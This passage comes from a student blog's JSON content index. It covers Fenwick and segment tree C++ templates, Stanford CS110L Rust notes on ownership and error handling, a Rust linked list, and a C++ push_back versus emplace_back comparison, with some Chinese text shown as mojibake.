56 57 58 59 /** * https://www.luogu.com.cn/problem/P3374 */ #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int MAXN = 5e5 + 10; int n, m; long long Tree[MAXN]; int lowbit(int x) { return -x\u0026amp;x; } void add(int x, int v) { while (x \u0026lt;= n) { Tree[x] += v; x += lowbit(x); } } long long query(int x) { long long sum = 0; while (x \u0026gt; 0) { sum += Tree[x]; x -= lowbit(x); } return sum; } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; vector\u0026lt;int\u0026gt; a(n); memset(Tree, 0, sizeof(Tree)); for (int i = 1; i \u0026lt;= n; ++i) { int num; cin \u0026gt;\u0026gt; num; add(i, num); } for (int i = 0; i \u0026lt; m; ++i) { int op, x, y; cin \u0026gt;\u0026gt; op \u0026gt;\u0026gt; x \u0026gt;\u0026gt; y; if (op == 1) { add(x, y); } else { cout \u0026lt;\u0026lt; query(y) - query(x-1) \u0026lt;\u0026lt; endl; } } return 0; } åŒºé—´ä¿®æ”¹ \u0026amp; åŒºé—´æ±‚å’Œ(To Do) å•ç‚¹ä¿®æ”¹ \u0026amp; åŒºé—´æœ€å€¼(To Do) çº¿æ®µæ ‘(Segment Tree) Reference: https://www.bilibili.com/video/BV1qY411n7Qs\nä¸å¸¦æ ‡è®°çº¿æ®µæ ‘ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 /** * https://www.luogu.com.cn/problem/P3374 */ #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int n, m; int a[500010], f[2000010]; inline void BuildTree(int k, int l, int r) { if (l == r) { f[k] = a[l]; return; } int m = (l + r) \u0026gt;\u0026gt; 1; BuildTree(k + k, l, m); BuildTree(k + k + 1, m+1, r); f[k] = f[k + k] + f[k + k + 1]; return; } inline void add(int k, int l, int r, int p, int v) { f[k] += v; if (l == r) return; int m = (l + r) \u0026gt;\u0026gt; 1; if (p \u0026lt;= m) add(k+k,l,m,p,v); else add(k+k+1,m+1,r,p,v); } inline int query(int k, int l, int r, int h, int t) { if (l == h \u0026amp;\u0026amp; r == t) return f[k]; int m = (l + r) \u0026gt;\u0026gt; 1; if (t \u0026lt;= m) return query(k+k,l,m,h,t); else if (h \u0026gt; m) return query(k+k+1,m+1,r,h,t); else return query(k+k,l,m,h,m) + query(k+k+1,m+1,r,m+1,t); } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; for (int i = 1; i \u0026lt;= n; ++i) cin \u0026gt;\u0026gt; a[i]; BuildTree(1,1,n); for (int i = 1; i \u0026lt;= m; ++i) { int op, x, y; cin \u0026gt;\u0026gt; op \u0026gt;\u0026gt; x \u0026gt;\u0026gt; y; if (op == 1) { add(1,1,n,x,y); } else { cout \u0026lt;\u0026lt; query(1,1,n,x,y) \u0026lt;\u0026lt; endl; } } return 0; } å¸¦æ ‡è®°çº¿æ®µæ ‘ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 /** * https://www.luogu.com.cn/problem/P3372 */ #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int n, m; long long a[100010], f[400010], ex[400010]; inline void BuildTree(int k, int l, int r) { ex[k] = 0; if (l == r) { f[k] = a[l]; return; } int m = (l + r) \u0026gt;\u0026gt; 1; BuildTree(k + k, l, m); BuildTree(k + k + 1, m+1, r); f[k] = f[k + k] + f[k + k + 1]; return; } /* å•ç‚¹ä¿®æ”¹ */ inline void add(int k, int l, int r, int p, int v) { f[k] += v; if (l == r) return; int m = (l + r) \u0026gt;\u0026gt; 1; if (p \u0026lt;= m) add(k+k,l,m,p,v); else add(k+k+1,m+1,r,p,v); } /* åŒºé—´ä¿®æ”¹ */ inline void add2(int k, int l ,int r, int h, int t, int v) { if (l == h \u0026amp;\u0026amp; r == t) { ex[k] += v; return; } f[k] += (t-h+1) * v; int m = (l + r) \u0026gt;\u0026gt; 1; if (t \u0026lt;= m) add2(k+k,l,m,h,t,v); else if (h \u0026gt; m) add2(k+k+1,m+1,r,h,t,v); else { add2(k+k,l,m,h,m,v); add2(k+k+1,m+1,r,m+1,t,v); } } inline long long query(int k, int l, int r, int h, int t) { if (l == h \u0026amp;\u0026amp; r == t) return f[k]; int m = (l + r) \u0026gt;\u0026gt; 1; if (t \u0026lt;= m) return query(k+k,l,m,h,t); else if (h \u0026gt; m) return query(k+k+1,m+1,r,h,t); else return query(k+k,l,m,h,m) + query(k+k+1,m+1,r,m+1,t); } inline long long query2(int k, int l, int r, int h, int t, long long p) { p += ex[k]; if (l == h \u0026amp;\u0026amp; r == t) return f[k] + p * (r - l + 1); int m = (l + r) \u0026gt;\u0026gt; 1; if (t \u0026lt;= m) return query2(k+k,l,m,h,t,p); else if (h \u0026gt; m) return query2(k+k+1,m+1,r,h,t,p); else return query2(k+k,l,m,h,m,p) + query2(k+k+1,m+1,r,m+1,t,p); } int main() { scanf(\u0026#34;%d%d\u0026#34;,\u0026amp;n,\u0026amp;m); for (int i = 1; i \u0026lt;= n; ++i) scanf(\u0026#34;%lld\u0026#34;,\u0026amp;a[i]); BuildTree(1,1,n); for (int i = 1; i \u0026lt;= m; ++i) { int op; scanf(\u0026#34;%d\u0026#34;,\u0026amp;op); if (op == 1) { int x, y, v; scanf(\u0026#34;%d%d%d\u0026#34;,\u0026amp;x,\u0026amp;y,\u0026amp;v); add2(1,1,n,x,y,v); } else { int x, y; scanf(\u0026#34;%d%d\u0026#34;,\u0026amp;x,\u0026amp;y); printf(\u0026#34;%lld\\n\u0026#34;, query2(1,1,n,x,y,0)); } } return 0; } Written by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-07-09T01:00:00Z","image":"https://unicocn.github.io/p/data-structures-and-algorithm-template/cover_hu5d3189b976991bbaa97ead5a2f977361_753368_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/data-structures-and-algorithm-template/","title":"å¸¸è§æ•°æ®ç»“æ„ \u0026 ç®—æ³•ã®æ¨¡æ¿"},{"content":" Code up a linked list using Rust!\nSpecifically, we will learn:\nHow to write object-oriented rust code and how this code is situated within the paradigm of ownership and borrowing weâ€™ve been discussing. How to allocate memory on the heap using theÂ BoxÂ smart pointer type. How to do error handling in Rust. How to represent the idea of a null-pointer usingÂ Option. How to convert a mutable reference to an owned value usingÂ take() (if time permits) How to use traits in Rust. Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 struct Node { value : u32, next : Option\u0026lt;Box\u0026lt;Node\u0026gt;\u0026gt;, // next could be nullptr, use Option\u0026lt;\u0026gt; } pub struct LinkedList { head : Option\u0026lt;Box\u0026lt;Node\u0026gt;\u0026gt;, size : usize, } impl Node { fn new(value : u32, next : Option\u0026lt;Box\u0026lt;Node\u0026gt;\u0026gt;) -\u0026gt; Node{ Node { value: value, next: next } } } impl LinkedList { pub fn new() -\u0026gt; LinkedList { LinkedList { head: None, size: 0 } } pub fn get_size(\u0026amp;self) -\u0026gt; usize { self.size } pub fn is_empty(\u0026amp;self) -\u0026gt; bool { self.size == 0 } pub fn push(\u0026amp;mut self, value : u32) { /* why use self.head.take() ? * because self.head is Option\u0026lt;Box\u0026lt;Node\u0026gt;\u0026gt;, and LinkedList has its ownership * now we want to give self.head\u0026#39;s ownership to Node::new() * so we could use .take(), to give self.head\u0026#39;s ownership to Node::new() * btw, take() is for Option\u0026lt;\u0026gt;, is self.head.is_some(), take() return Some() * leave None to self.head, is self.head.is_none(), take() return None */ let new_node = Box::new(Node::new(value, self.head.take())); self.head = Some(new_node); self.size += 1; } pub fn pop(\u0026amp;mut self) -\u0026gt; Option\u0026lt;u32\u0026gt; { let node = self.head.take()?; // if self.head is None, return None, else continue self.head = node.next; self.size -= 1; Some(node.value) } pub fn display(\u0026amp;self) { let mut current = \u0026amp;self.head; let mut result = String::new(); loop { match current { Some(node) =\u0026gt; { result = format!(\u0026#34;{} {}\u0026#34;, result, node.value); current = \u0026amp;node.next; }, None =\u0026gt; break, } } println!(\u0026#34;{}\u0026#34;, result); } } fn main() { let mut list = LinkedList::new(); for i in 1..10 { list.push(i); } list.display(); list.pop(); list.display(); assert!(list.get_size() == 8); } Explain: When to use unwrap | expect Example:\nFirst, youâ€™ll need to open the file by callingÂ File::open(filename).Â File::openÂ returns aÂ Result, since opening the file may fail (e.g. if the filename is invalid).\nYou could open the file like this:\n1 let file = File::open(filename).unwrap(); However, itâ€™s generally good style to avoid callingÂ unwrapÂ orÂ expectÂ unless the error absolutely should never occur, or unless youâ€™re writing the code inÂ mainÂ or some other high-level function that wonâ€™t be reused in your program. If you useÂ unwrapÂ orÂ expectÂ in helper functions, then code might use those helper functions without realizing they could cause panics.\nThe idiomatic way to deal with this is to write something like the following:\n1 let file = File::open(filename)?; TheÂ ? operatorÂ is commonly used in Rust to propagate errors without having to repeatedly write a lot of code to check aÂ Result. That line of code really expands to this:\n1 2 3 4 let file = match File::open(filename) { Ok(file) =\u0026gt; file, Err(err) =\u0026gt; return Err(err), }; If theÂ ResultÂ wasÂ Ok, then theÂ ?Â gives you the returned value, but if the result was anÂ Err, it causes your function to return thatÂ ErrÂ (propagating the error through the call chain).\nOnce you have your file open, you can read the lines like so:\n1 2 3 4 for line in io::BufReader::new(file).lines() { let line_str = line?; // do something with line_str* } In this code,Â lineÂ is aÂ Result\u0026lt;String, io::Error\u0026gt;. We can safely unwrap itsÂ OkÂ value usingÂ ?, as we did when opening the file. Then, you can add the string to a vector.\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-15T00:00:00Z","image":"https://unicocn.github.io/p/rust-cs110l-notes-3/cover_hu5f8d5b24f629f61bf6061899af2962f9_20586_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/rust-cs110l-notes-3/","title":"Stanford CS110L Notes 3"},{"content":"ChatGPT ä½¿ç”¨æ‰‹å†Œï¼ˆæŒç»­æ›´æ–°ï¼‰ ChatGPTæ­£åœ¨æ”¹å˜è¿™ä¸ªä¸–ç•Œï¼Œå¯¹äºèº«å¤„æ—¶ä»£å‰§å˜ä¸­çš„ä¸ªä½“ï¼Œåˆ©ç”¨å¥½è¿™ä¸ªå¼ºå¤§çš„AIåŠ©æ‰‹ï¼Œå¯ä»¥æå¤§åœ°æé«˜è‡ªèº«å­¦ä¹ æ•ˆç‡å’Œç”Ÿäº§åŠ› æœ¬æ–‡å—@è¥¿è¥¿å¼—æ–¯æ²¡é—®é¢˜ å¯å‘ï¼Œéƒ¨åˆ†å†…å®¹å‚è€ƒäº†ç©è½¬ChatGPT\nChatGPTä½¿ç”¨æ¸ é“ ä½¿ç”¨ChatGPTçš„å¿…å¤‡æŠ€èƒ½ï¼šç§‘å­¦ä¸Šç½‘\nç½‘ç«™ API åº”ç”¨è½¯ä»¶ æµè§ˆå™¨æ’ä»¶ å¦‚ä½•å†™å‡ºæ›´å¥½çš„prompt ChatGPT Prompt Engineering for Developers By Andrew Ng Link: ChatGPT Prompt Engineering for Developers\næ•ˆç‡Up Up! å­¦ä¹  åœºæ™¯ä¸€ï¼šåˆ¶ä½œPPT å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\nåœºæ™¯äºŒï¼šä½œä¸šç­”ç–‘ å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\nåœºæ™¯ä¸‰ï¼šæ’°å†™è¯¾ç¨‹è®ºæ–‡ å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\nç§‘ç ” åœºæ™¯ä¸€ï¼šå¿«é€Ÿé˜…è¯»è®ºæ–‡ å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\nåœºæ™¯äºŒï¼šè®ºæ–‡ç¿»è¯‘ å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\nè‹±è¯­ åœºæ™¯ä¸€ï¼šç»ƒä¹ å£è¯­ å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\nåœºæ™¯äºŒï¼šçº æ­£è¯­æ³• å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\nåœºæ™¯ä¸‰ï¼šæƒ…å¢ƒå†™ä½œ å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\nåœºæ™¯å››ï¼šæ–‡ç« ç¾åŒ– å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\né¢è¯• åœºæ™¯ä¸€ï¼šæ’°å†™è‡ªæˆ‘ä»‹ç» å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\nåœºæ™¯äºŒï¼šäº†è§£å²—ä½è¦æ±‚ å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\nåœºæ™¯ä¸‰ï¼šè¾…åŠ©é¢è¯•å¤ç›˜ å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\nå·¥ä½œ åœºæ™¯ä¸€ï¼šæŠ¥å‘Šæ’°å†™ å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\nåœºæ™¯äºŒï¼šèŒä¸šè§„åˆ’ å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\nç”Ÿæ´» åœºæ™¯ä¸€ï¼šç”Ÿæ´»å¸¸è¯† å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\nåœºæ™¯äºŒï¼šæ—¥å¸¸é¥®é£Ÿ å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\nåœºæ™¯ä¸‰ï¼šæ—…æ¸¸è§„åˆ’ å·¥å…·æ¨è\nä½¿ç”¨æŒ‡å—\nèµ„æºæ¨è [è§†é¢‘æ•™ç¨‹] ä½ çœŸçš„ä¼šç”¨ChatGPTäº†å—ï¼Ÿã€Œå»ºè®®æ”¶è—ã€20åˆ†é’Ÿå­¦å®ŒChatGPTçš„æ­£ç¡®ä½¿ç”¨æ–¹å¼ï½œé‡Šæ”¾ä½ çš„åå€ç”Ÿäº§åŠ› Reference ç©è½¬ChatGPT\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-13T12:00:00Z","image":"https://unicocn.github.io/p/chatgpt-tutorial/cover_hua6252465c422341b1644c214632e7298_33850_120x120_fill_q75_box_smart1.jpg","permalink":"https://unicocn.github.io/p/chatgpt-tutorial/","title":"ç”Ÿäº§åŠ›æé«˜æŒ‡å— â€”â€” ChatGPTä½¿ç”¨æ‰‹å†Œ"},{"content":" Rust â€”â€” A language empowering everyone to build reliable and efficient software.\nLec03: Error Handling Ownership Example One:\n1 2 3 4 5 6 7 8 9 fn f(s: String) { println!(\u0026#34;{}\u0026#34;, s); } fn main() { let s = String::from(\u0026#34;Hello\u0026#34;); f(s); // will work f(s); // won\u0026#39;t work } The problem is in the first f(s), main has give s â€™s ownership to f, and f doesnâ€™t give it back. So main lose s â€™s ownership in the second f(s). By the way, after the first f(s) ends, s will be free.\nğŸŒŸExceptionï¼š\n1 2 3 4 5 6 7 8 9 fn om_nom_nom(param: u32) { println!(\u0026#34;{}\u0026#34;, param); } fn main() { let x = 1; om_nom_nom(x); // will work om_nom_nom(x); // will work } It works fine because u32 implements a â€œcopy traitâ€ that changes what happens when it is assigned to variables or passed as a parameter.\nGood news, only primitive types + a handful of others use copy semantics, and you just need to remember those.\nExample Two:\n1 2 3 4 5 6 fn main() { let s = String::from(\u0026#34;hello\u0026#34;); let s1 = \u0026amp;s; let s2 = \u0026amp;s; println!(\u0026#34;{} {}\u0026#34;, s, s1); } It works fine, because s s1 s2 are all immutable.\nRemember, you can have as many read-only pointers to something as you want, as long as no one can change what is being pointed to.\nğŸŒŸÂ Counter Example One:\n1 2 3 4 5 6 fn main() { let s = String::from(\u0026#34;hello\u0026#34;); let s1 = \u0026amp;mut s; // invalid let s2 = \u0026amp;s; println!(\u0026#34;{} {}\u0026#34;, s, s1); } This fails to compile becauseÂ sÂ is immutable, and on the next line, we try to borrow aÂ mutableÂ reference toÂ s. If this were allowed, we could modify the string usingÂ s1, even though it was supposed to be immutable.\nğŸŒŸÂ Counter Example Two:\n1 2 3 4 5 6 fn main() { let mut s = String::from(\u0026#34;hello\u0026#34;); let s1 = \u0026amp;mut s; let s2 = \u0026amp;s; println!(\u0026#34;{} {} {}\u0026#34;, s, s1, s2); } This fails again, but for a different reason.\nWe first declareÂ sÂ as mutable. ğŸ‘ We borrow a mutable reference toÂ s. ğŸ‘ We try to borrow an immutable reference toÂ s. However, there already exists a mutable reference toÂ s. Rust doesnâ€™t allow multiple references to exist when a mutable reference has been borrowed. Otherwise, the mutable reference could be used to change (potentially reallocate) memory when code using the other references least expect it. ğŸŒŸÂ Counter Example Three:\n1 2 3 4 5 fn main() { let mut s = String::from(\u0026#34;hello\u0026#34;); let s1 = \u0026amp;mut s; println!(\u0026#34;{} {}\u0026#34;, s, s1); } We first declareÂ sÂ as mutable. ğŸ‘ We borrow a mutable reference toÂ s. ğŸ‘ We try to useÂ s. However, the value has been â€œborrowed outâ€ toÂ s1Â and hasnâ€™t been â€œreturnedâ€ yet. As such, we canâ€™t useÂ s1. Example Three:\n1 2 3 4 5 6 fn main() { let mut s = String::from(\u0026#34;hello\u0026#34;); let s1 = \u0026amp;mut s; // s1 borrows s here println!(\u0026#34;{}\u0026#34;, s1); // return s\u0026#39;s ownership after this line println!(\u0026#34;{}\u0026#34;, s) } It works fine.\nğŸ’­Â Thinking\nâ€œOne thing thatâ€™s confusing is why sometimes I need to \u0026amp;var and other times I can just use var: for example, set.contains(\u0026amp;var), but set.insert(var) â€“ why?\u0026quot;\nAnswer:\nWhen inserting an item into a set, we want to transfer ownership of that item into the set; that way, the item will exist as long as the set exists. (It would be bad if you added a string to the set, and then someone freed the string while it was still a member of the set.) However, when trying to see if the set contains an item, we want to retain ownership, so we only pass a reference.\nError Handling about null pointer Introduce Option\u0026lt;T\u0026gt; in Rust\nNull pointer is dangerous in C/C++. To solve this problem, we might want some way to indicate to the compiler when a valueÂ mightÂ beÂ NULL, so that the compiler can then ensure code using those values is equipped to handleÂ NULL.\nRust does this with theÂ OptionÂ type. A value of typeÂ Option\u0026lt;T\u0026gt;Â can either beÂ NoneÂ orÂ Some(value of type T).\nDefinition of Option\u0026lt;T\u0026gt;:\n1 2 3 4 pub enum Option\u0026lt;T\u0026gt; { None, Some(T), } Example:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 fn feeling_lucky() -\u0026gt; Option\u0026lt;String\u0026gt; { if get_random_num() \u0026gt; 10 { Some(String::from(\u0026#34;I\u0026#39;m feeling lucky!\u0026#34;)) } else { None } } // how to use Option\u0026lt;T\u0026gt;? // mothod 1, use is_none() or is_some() to check if feeling_lucky().is_none() { println!(\u0026#34;Not feeling lucky :(\u0026#34;); } // method 2, use unwrap_or(default), if it\u0026#39;s none, use default let message = feeling_lucky().unwrap_or(String::from(\u0026#34;Not lucky :(\u0026#34;)); // method 3, a more idiomatical way match feeling_lucky() { Some(message) =\u0026gt; { println!(\u0026#34;Got message: {}\u0026#34;, message); }, None =\u0026gt; { println!(\u0026#34;No message returned :-/\u0026#34;); }, } Handling errors Introduce Result\u0026lt;T, E\u0026gt; in Rust\nC has an absolutely garbage system for handling errors. C++ and many other languages use exceptions to manage error conditions. It works well, but also has many disadvantages failure modes are hard to spot Rust takes a different, two-pronged approach to error handling\nunrecoverable error, use panic! 1 2 3 if sad_times() { panic!(\u0026#34;Sad times!\u0026#34;); } Panics terminate the program immediately and cannot be caught.\n(Side note: itâ€™s technically possible to catch and recover from panics, but doing so really defeats the philosophy of error handling in Rust, so itâ€™s not advised.)\nrecoverable error You should return aÂ Result. If you returnÂ Result\u0026lt;T, E\u0026gt;, you can either returnÂ Ok(value of type T)Â orÂ Err(value of type E)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 fn poke_toddler() -\u0026gt; Result\u0026lt;\u0026amp;\u0026#39;static str, \u0026amp;\u0026#39;static str\u0026gt; { if get_random_num() \u0026gt; 10 { Ok(\u0026#34;Hahahaha!\u0026#34;) } else { Err(\u0026#34;Waaaaahhh!\u0026#34;) } } fn main() { match poke_toddler() { Ok(message) =\u0026gt; println!(\u0026#34;Toddler said: {}\u0026#34;, message), Err(cry) =\u0026gt; println!(\u0026#34;Toddler cried: {}\u0026#34;, cry), } } Or you could use unwrap instead\n1 2 3 4 // Panic if the baby cries: let ok_message = poke_toddler().unwrap(); // Same thing, but print a more descriptive panic message: let ok_message = poke_toddler().expect(\u0026#34;Toddler cried :(\u0026#34;); If theÂ ResultÂ wasÂ Ok,Â unwrap()Â returns the success value; otherwise, it causes a panic.Â expect()Â does the same thing, but prints the supplied error message when it panics\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-12T10:20:00Z","image":"https://unicocn.github.io/p/rust-cs110l-notes-2/cover_hu5f8d5b24f629f61bf6061899af2962f9_20586_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/rust-cs110l-notes-2/","title":"Stanford CS110L Notes 2"},{"content":" Rust â€”â€” A language empowering everyone to build reliable and efficient software.\nIntro Official Course Website CS 110L: Safety in Systems Programming\nMy Homework Repository GitHub - UnicoCN/learn-rust\nLec01: Why Rust Why not C/C++? Security Issue buffer overflow integer overflow(signed â†’ unsigned) Why not GCâ€™ed language? downsides of GC Expensive Disruptive Non-deterministic Precludes manual optimization can not solve memory leak completely Lec02: Memory Safety Why is it so easy to screw up in C? Dangling Pointers Double Frees Iterator Invalidation Memory Leaks Ownership Rules Each value in Rust has a variable thatâ€™s called its owner There can only be one owner at a time When the owner goes out of scope, the value will dropped Lifetime Written by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-12T10:15:00Z","image":"https://unicocn.github.io/p/rust-cs110l-notes-1/cover_hu5f8d5b24f629f61bf6061899af2962f9_20586_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/rust-cs110l-notes-1/","title":"Stanford CS110L Notes 1"},{"content":"åŸæ–‡ï¼šç†è§£ STL - è¿­ä»£å™¨ä¸å‡½æ•°å¯¹è±¡\nWritten by @xuan-insr\n","date":"2023-06-12T10:13:00Z","image":"https://unicocn.github.io/p/cpp-stl-iterator-and-function-object/cover_hu6170f1f82b3711c204643e7d26f97db9_36645_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/cpp-stl-iterator-and-function-object/","title":"ï¼ˆè½¬è½½ï¼‰ç†è§£ STLâ€”â€”è¿­ä»£å™¨å’Œå‡½æ•°å¯¹è±¡"},{"content":"ä»€ä¹ˆæ˜¯push_backå’Œemplace_back push_backå’Œemplace_backæ˜¯C++11å¼•å…¥çš„æˆå‘˜å‡½æ•°ï¼Œç”¨äºå¯¹vectorå®¹å™¨çš„æœ«å°¾è¿›è¡Œæ·»åŠ å…ƒç´  push_backçš„å‡½æ•°ç­¾å voidÂ push_back(Â constÂ T\u0026amp;Â valueÂ ); (until C++20) constexprÂ voidÂ push_back(Â constÂ T\u0026amp;Â valueÂ ); (since C++20) voidÂ push_back(Â T\u0026amp;\u0026amp;Â valueÂ ); (since C++11) (until C++20) constexprÂ voidÂ push_back(Â T\u0026amp;\u0026amp;Â valueÂ ); (since C++20) emplace_backçš„å‡½æ•°ç­¾å template\u0026lt;Â class\u0026hellip;Â ArgsÂ \u0026gt;voidÂ emplace_back(Â Args\u0026amp;\u0026amp;\u0026hellip;Â argsÂ ); (since C++11) (until C++17) template\u0026lt;Â class\u0026hellip;Â ArgsÂ \u0026gt;reference emplace_back(Â Args\u0026amp;\u0026amp;\u0026hellip;Â argsÂ ); (since C++17) (until C++20) template\u0026lt;Â class\u0026hellip;Â ArgsÂ \u0026gt;constexprÂ reference emplace_back(Â Args\u0026amp;\u0026amp;\u0026hellip;Â argsÂ ); (since C++20) push_backå’Œemplace_backçš„å¼‚åŒç‚¹ push_backä»…æ”¯æŒä¼ å…¥ä¸€ä¸ªå‚æ•°ï¼Œè€Œemplace_backæ”¯æŒä¼ å…¥ä¸€ä¸ªå¯å˜å‚æ•°åˆ—è¡¨ push_backæ”¯æŒä¼ å…¥å·¦å€¼ï¼ˆå¸¸é‡å·¦å€¼å¼•ç”¨æ•è·ï¼‰å’Œå³å€¼ï¼ˆå³å€¼å¼•ç”¨æ•è·ï¼‰ï¼Œemplace_backä¹Ÿæ”¯æŒä¼ å…¥å·¦å€¼å’Œå³å€¼ å¯¹äºä¼ å…¥çš„å·¦å€¼ï¼ŒäºŒè€…å‡è°ƒç”¨ä¸€æ¬¡constructorã€ä¸€æ¬¡copy constructorå’Œä¸€æ¬¡destructor å¯¹äºä¼ å…¥çš„å³å€¼ï¼ŒäºŒè€…å‡è°ƒç”¨ä¸€æ¬¡constructorã€ä¸€æ¬¡move constructorå’Œä¸€æ¬¡destructor emplace_backå¯ä»¥ä¼ å…¥æ„é€ å‡½æ•°æ‰€éœ€çš„ä¸€ç³»åˆ—å‚æ•°ï¼Œæ”¯æŒin-place constructï¼Œè€Œpush_backä¸æ”¯æŒï¼Œå› æ­¤è‹¥ä¼ å…¥æ„é€ å‡½æ•°æ‰€éœ€çš„ä¸€ç³»åˆ—å‚æ•°ï¼Œåˆ™åªä¼šè°ƒç”¨ä¸€æ¬¡constructorï¼ˆè¯¦è§ä¾‹å­ï¼‰ insertå’Œemplaceçš„å¼‚åŒå’Œpush_backå’Œemplace_backç±»ä¼¼ å¸¸è§è¯¯åŒº emplace_backç›¸æ¯”äºpush_backå¯ä»¥æå‡æ•ˆç‡ï¼ŒåŸå› æ˜¯å¯ä»¥å‡å°‘ä¸å¿…è¦çš„æ„é€ å‡½æ•°è°ƒç”¨ å¯¹äºç›´æ¥ä¼ å…¥å·¦å€¼æˆ–è€…å³å€¼çš„æƒ…å†µï¼Œemplace_backå¹¶æ— æ³•æå‡æ•ˆç‡ï¼ŒäºŒè€…éƒ½ä¼šåˆ›å»ºä¸€ä¸ªä¸´æ—¶å¯¹è±¡ï¼Œé€šè¿‡è¯¥ä¸´æ—¶å¯¹è±¡è¿›è¡Œæ‹·è´/ç§»åŠ¨æ„é€ ï¼Œä¹‹åå†é”€æ¯è¯¥ä¸´æ—¶å¯¹è±¡\nemplace_backæ”¯æŒå³å€¼å¼•ç”¨ï¼Œè€Œpush_backä¸æ”¯æŒ ä»å‡½æ•°ç­¾åå¯ä»¥çœ‹åˆ°push_backä¹Ÿæ˜¯æ”¯æŒå³å€¼å¼•ç”¨çš„ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒç§»åŠ¨è¯­ä¹‰ï¼ˆè°ƒç”¨ç§»åŠ¨æ„é€ å‡½æ•°ï¼‰\nä¾‹å­ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 #include \u0026lt;vector\u0026gt; #include \u0026lt;cassert\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; struct President { std::string name; std::string country; int year; President(std::string p_name,std::string p_country, int p_year) : name(std::move(p_name)), country(std::move(p_country)), year(p_year) { std::cout \u0026lt;\u0026lt; \u0026#34;I am being constructed.\\n\u0026#34;; } President(President\u0026amp;\u0026amp; other) : name(std::move(other.name)), country(std::move(other.country)), year(other.year) { std::cout \u0026lt;\u0026lt; \u0026#34;I am being moved.\\n\u0026#34;; } President\u0026amp; operator=(const President\u0026amp; other) = default; }; int main() { std::vector\u0026lt;President\u0026gt; elections; std::cout \u0026lt;\u0026lt; \u0026#34;emplace_back:\\n\u0026#34;; auto\u0026amp; ref = elections.emplace_back(\u0026#34;Nelson Mandela\u0026#34;, \u0026#34;South Africa\u0026#34;, 1994); assert(ref.year == 1994 \u0026amp;\u0026amp; \u0026#34;uses a reference to the created object (C++17)\u0026#34;); std::vector\u0026lt;President\u0026gt; reElections; std::cout \u0026lt;\u0026lt; \u0026#34;\\npush_back:\\n\u0026#34;; reElections.push_back(President(\u0026#34;Franklin Delano Roosevelt\u0026#34;, \u0026#34;the USA\u0026#34;, 1936)); std::cout \u0026lt;\u0026lt; \u0026#34;\\nContents:\\n\u0026#34;; for (President const\u0026amp; president: elections) std::cout \u0026lt;\u0026lt; president.name \u0026lt;\u0026lt; \u0026#34; was elected president of \u0026#34; \u0026lt;\u0026lt; president.country \u0026lt;\u0026lt; \u0026#34; in \u0026#34; \u0026lt;\u0026lt; president.year \u0026lt;\u0026lt; \u0026#34;.\\n\u0026#34;; for (President const\u0026amp; president: reElections) std::cout \u0026lt;\u0026lt; president.name \u0026lt;\u0026lt; \u0026#34; was re-elected president of \u0026#34; \u0026lt;\u0026lt; president.country \u0026lt;\u0026lt; \u0026#34; in \u0026#34; \u0026lt;\u0026lt; president.year \u0026lt;\u0026lt; \u0026#34;.\\n\u0026#34;; } /* Outputï¼š emplace_back: I am being constructed. push_back: I am being constructed. I am being moved. Contents: Nelson Mandela was elected president of South Africa in 1994. Franklin Delano Roosevelt was re-elected president of the USA in 1936. */ 